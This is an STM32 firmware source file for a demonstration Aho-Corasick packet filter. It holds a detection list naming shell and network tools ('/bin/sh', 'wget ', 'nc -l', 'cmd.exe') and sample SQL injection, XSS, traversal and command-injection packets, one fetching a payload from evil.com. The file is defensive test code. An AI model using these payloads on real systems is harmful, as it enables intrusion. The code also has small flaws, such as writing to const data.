/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : STM32 Network Packet Filter using Aho-Corasick Algorithm
  ******************************************************************************
  * Network packet filtering with realistic pattern count for 80 vertices
  * Estimated ~15-20 patterns maximum for 80 vertices
  * Static Input for demonstration and testing
  * 
  * Features:
  * - Real network threat patterns detection
  * - Static packet samples for testing
  * - UART output for results
  * - LED indicators for threats
  * - Optimized for STM32F030R8 constraints
  ******************************************************************************
  */
/* USER CODE END Header */

/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "aho_corasick.h"
#include <string.h>
#include <stdio.h>

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */

/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

typedef struct {
    const char* name;
    const char* content;
    uint16_t length;
    bool is_malicious;
} network_packet_t;

typedef struct {
    uint32_t total_packets;
    uint32_t malicious_packets;
    uint32_t clean_packets;
    uint32_t total_threats_found;
    uint32_t current_packet_threats;
} filter_stats_t;

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */

#define LED_GREEN_Pin GPIO_PIN_5
#define LED_GREEN_GPIO_Port GPIOA
#define USER_BUTTON_Pin GPIO_PIN_13
#define USER_BUTTON_GPIO_Port GPIOC

#define NUM_TEST_PACKETS 10
#define NUM_THREAT_PATTERNS 16

/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart2;

/* USER CODE BEGIN PV */

// Network threat patterns - optimized for ~80 vertices
static const char* network_threat_patterns[NUM_THREAT_PATTERNS] = {
    // SQL Injection patterns
    "' OR 1=1",         // 8 chars
    "UNION SELECT",     // 12 chars
    "DROP TABLE",       // 10 chars
    "admin'--",         // 8 chars
    
    // XSS patterns
    "<script>",         // 8 chars
    "javascript:",      // 11 chars
    "alert(",           // 6 chars
    
    // Command injection
    "/bin/sh",          // 7 chars
    "cmd.exe",          // 7 chars
    "wget ",            // 5 chars
    
    // Network exploits
    "nc -l",            // 5 chars
    "nmap",             // 4 chars
    
    // File inclusion
    "../",              // 3 chars
    "..\\",             // 3 chars
    
    // Malware indicators
    "payload",          // 7 chars
    "exploit"           // 7 chars
};

// Static test packets simulating network traffic
static const network_packet_t test_packets[NUM_TEST_PACKETS] = {
    {
        "HTTP Request",
        "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        0, false
    },
    {
        "SQL Injection Attack",
        "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'-- &password=test",
        0, true
    },
    {
        "XSS Attack",
        "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n",
        0, true
    },
    {
        "Directory Traversal",
        "GET /../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n",
        0, true
    },
    {
        "Normal HTTPS",
        "GET /secure/data HTTP/1.1\r\nHost: secure.com\r\nAuthorization: Bearer token123\r\n\r\n",
        0, false
    },
    {
        "Command Injection",
        "POST /system HTTP/1.1\r\nContent-Type: text/plain\r\n\r\ncmd=ls; /bin/sh -c 'wget http://evil.com/payload'",
        0, true
    },
    {
        "Port Scan Detection",
        "TCP SYN scan detected: nmap -sS -O target_host attempting port enumeration",
        0, true
    },
    {
        "File Upload",
        "POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\nfilename=document.pdf",
        0, false
    },
    {
        "SQL Union Attack",
        "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1\r\n\r\n",
        0, true
    },
    {
        "Clean API Call",
        "POST /api/v1/users HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"name\":\"John\",\"email\":\"john@example.com\"}",
        0, false
    }
};

static ac_automaton_t packet_filter;
static filter_stats_t stats;
static char output_buffer[256];

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_USART2_UART_Init(void);

/* USER CODE BEGIN PFP */

static void init_packet_filter(void);
static void process_packet(const network_packet_t* packet);
static void analyze_all_packets(void);
static void print_statistics(void);
static void print_packet_analysis(const network_packet_t* packet);
static void threat_detected_callback(const char* pattern, int position);
static void indicate_threat_led(void);
static void indicate_clean_led(void);

/* USER CODE END PFP */

/* USER CODE BEGIN 0 */

/**
 * @brief Callback executado quando uma ameaça é detectada
 */
static void threat_detected_callback(const char* pattern, int position) {
    stats.total_threats_found++;
    stats.current_packet_threats++;
    
    // Log da ameaça detectada
    snprintf(output_buffer, sizeof(output_buffer), 
             "    THREAT: Pattern '%s' found at position %d\r\n", pattern, position);
    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
}

/**
 * @brief Inicializa o filtro de pacotes
 */
static void init_packet_filter(void) {
    // Inicializa o autômato Aho-Corasick
    ac_init(&packet_filter, threat_detected_callback);
    
    // Adiciona todos os padrões de ameaças
    uint8_t patterns_loaded = 0;
    for (int i = 0; i < NUM_THREAT_PATTERNS; i++) {
        if (ac_add_pattern(&packet_filter, network_threat_patterns[i])) {
            patterns_loaded++;
        } else {
            snprintf(output_buffer, sizeof(output_buffer), 
                     "ERROR: Failed to load pattern %d: '%s'\r\n", i, network_threat_patterns[i]);
            HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
            break;
        }
    }
    
    // Constrói o autômato
    ac_build(&packet_filter);
    
    // Inicializa estatísticas
    memset(&stats, 0, sizeof(stats));
    
    // Calcula tamanhos dos pacotes
    for (int i = 0; i < NUM_TEST_PACKETS; i++) {
        ((network_packet_t*)&test_packets[i])->length = strlen(test_packets[i].content);
    }
    
    // Relatório de inicialização
    snprintf(output_buffer, sizeof(output_buffer), 
             "\r\n=== STM32 Network Packet Filter Initialized ===\r\n"
             "Threat patterns loaded: %d/%d\r\n"
             "Vertices used: %d/80\r\n"
             "Test packets ready: %d\r\n\r\n",
             patterns_loaded, NUM_THREAT_PATTERNS, 
             packet_filter.vertex_count, NUM_TEST_PACKETS);
    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 2000);
}

/**
 * @brief Processa um único pacote
 */
static void process_packet(const network_packet_t* packet) {
    stats.total_packets++;
    stats.current_packet_threats = 0;
    
    // Analisa o pacote com Aho-Corasick
    ac_search(&packet_filter, packet->content);
    
    // Classifica o resultado
    if (stats.current_packet_threats > 0) {
        stats.malicious_packets++;
        indicate_threat_led();
    } else {
        stats.clean_packets++;
        indicate_clean_led();
    }
    
    // Imprime análise do pacote
    print_packet_analysis(packet);
}

/**
 * @brief Imprime análise detalhada do pacote
 */
static void print_packet_analysis(const network_packet_t* packet) {
    const char* status = (stats.current_packet_threats > 0) ? "MALICIOUS" : "CLEAN";
    const char* expected = packet->is_malicious ? "MALICIOUS" : "CLEAN";
    const char* result = (stats.current_packet_threats > 0) == packet->is_malicious ? "CORRECT" : "MISSED";
    
    snprintf(output_buffer, sizeof(output_buffer), 
             "Packet: %s\r\n"
             "  Size: %d bytes\r\n"
             "  Status: %s (%d threats)\r\n"
             "  Expected: %s\r\n"
             "  Detection: %s\r\n\r\n",
             packet->name, packet->length, status, 
             stats.current_packet_threats, expected, result);
    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 2000);
}

/**
 * @brief Analisa todos os pacotes de teste
 */
static void analyze_all_packets(void) {
    HAL_UART_Transmit(&huart2, (uint8_t*)"=== Starting Packet Analysis ===\r\n\r\n", 38, 1000);
    
    for (int i = 0; i < NUM_TEST_PACKETS; i++) {
        snprintf(output_buffer, sizeof(output_buffer), 
                 "--- Analyzing Packet %d/%d ---\r\n", i+1, NUM_TEST_PACKETS);
        HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
        
        process_packet(&test_packets[i]);
        
        HAL_Delay(1000); // Pausa entre pacotes para visualização
    }
    
    HAL_UART_Transmit(&huart2, (uint8_t*)"=== Analysis Complete ===\r\n\r\n", 31, 1000);
}

/**
 * @brief Imprime estatísticas finais
 */
static void print_statistics(void) {
    float detection_rate = (stats.total_packets > 0) ? 
        (float)stats.malicious_packets / stats.total_packets * 100.0f : 0.0f;
    
    snprintf(output_buffer, sizeof(output_buffer), 
             "=== FINAL STATISTICS ===\r\n"
             "Total packets analyzed: %lu\r\n"
             "Malicious packets: %lu\r\n"
             "Clean packets: %lu\r\n"
             "Total threats detected: %lu\r\n"
             "Detection rate: %.1f%%\r\n"
             "Vertices used: %d/80 (%.1f%%)\r\n"
             "Patterns loaded: %d\r\n\r\n",
             stats.total_packets, stats.malicious_packets, stats.clean_packets,
             stats.total_threats_found, detection_rate,
             packet_filter.vertex_count, 
             (float)packet_filter.vertex_count / 80.0f * 100.0f,
             packet_filter.pattern_count);
    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 3000);
}

/**
 * @brief Indica ameaça detectada via LED
 */
static void indicate_threat_led(void) {
    // LED pisca rápido (vermelho simulado)
    for (int i = 0; i < 3; i++) {
        HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
        HAL_Delay(100);
        HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
        HAL_Delay(100);
    }
}

/**
 * @brief Indica pacote limpo via LED
 */
static void indicate_clean_led(void) {
    // LED acende por 200ms (verde)
    HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
    HAL_Delay(200);
    HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
}

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void) {
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_USART2_UART_Init();

  /* USER CODE BEGIN 2 */
  
  // Inicialização do sistema
  HAL_UART_Transmit(&huart2, (uint8_t*)"\r\n\r\nSTM32F030R8 Network Packet Filter\r\n", 37, 1000);
  HAL_UART_Transmit(&huart2, (uint8_t*)"Initializing Aho-Corasick filter...\r\n", 38, 1000);
  
  // Inicializa o filtro de pacotes
  init_packet_filter();
  
  // Indica sistema pronto
  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
  HAL_Delay(500);
  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);

  UART_Transmit_String("--- Filtro de SPAM Aho-Corasick STM32 ---\r\n");
  UART_Transmit_String("Inicializando e construindo base de dados de SPAM...\r\n\r\n");

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1) {
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
    
    // Executa análise completa dos pacotes
    analyze_all_packets();
    
    // Mostra estatísticas finais
    print_statistics();
    
    // Lista padrões carregados
    HAL_UART_Transmit(&huart2, (uint8_t*)"=== LOADED THREAT PATTERNS ===\r\n", 33, 1000);
    for (int i = 0; i < packet_filter.pattern_count; i++) {
        snprintf(output_buffer, sizeof(output_buffer), 
                 "%2d: '%s'\r\n", i+1, packet_filter.patterns[i]);
        HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 500);
    }
    
    // Aguarda botão do usuário para reiniciar
    HAL_UART_Transmit(&huart2, (uint8_t*)"\r\nPress USER button to restart analysis...\r\n\r\n", 46, 1000);
    
    // Aguarda botão ser pressionado
    while (HAL_GPIO_ReadPin(USER_BUTTON_GPIO_Port, USER_BUTTON_Pin) == GPIO_PIN_SET) {
        // LED heartbeat enquanto aguarda
        HAL_GPIO_TogglePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin);
        HAL_Delay(1000);
    }
    
    // Debounce do botão
    HAL_Delay(200);
    while (HAL_GPIO_ReadPin(USER_BUTTON_GPIO_Port, USER_BUTTON_Pin) == GPIO_PIN_RESET) {
        HAL_Delay(10);
    }
    
    // Reset das estatísticas para nova análise
    memset(&stats, 0, sizeof(stats));
    
    HAL_UART_Transmit(&huart2, (uint8_t*)"\r\n" "=== RESTARTING ANALYSIS ===\r\n\r\n", 33, 1000);
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void) {
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitStruct structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK) {
    Error_Handler();
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK) {
    Error_Handler();
  }
}

/**
  * @brief USART2 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART2_UART_Init(void) {
  /* USER CODE BEGIN USART2_Init 0 */

  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
  huart2.Init.BaudRate = 115200;
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
  huart2.Init.StopBits = UART_STOPBITS_1;
  huart2.Init.Parity = UART_PARITY_NONE;
  huart2.Init.Mode = UART_MODE_TX_RX;
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
  if (HAL_UART_Init(&huart2) != HAL_OK) {
    Error_Handler();
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */
}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void) {
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin : USER_BUTTON_Pin */
  GPIO_InitStruct.Pin = USER_BUTTON_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_PULLUP;
  HAL_GPIO_Init(USER_BUTTON_GPIO_Port, &GPIO_InitStruct);

  /*Configure GPIO pin : LED_GREEN_Pin */
  GPIO_InitStruct.Pin = LED_GREEN_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(LED_GREEN_GPIO_Port, &GPIO_InitStruct);
}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void) {
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1) {
  }
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name and location of the C source file where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line) {
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */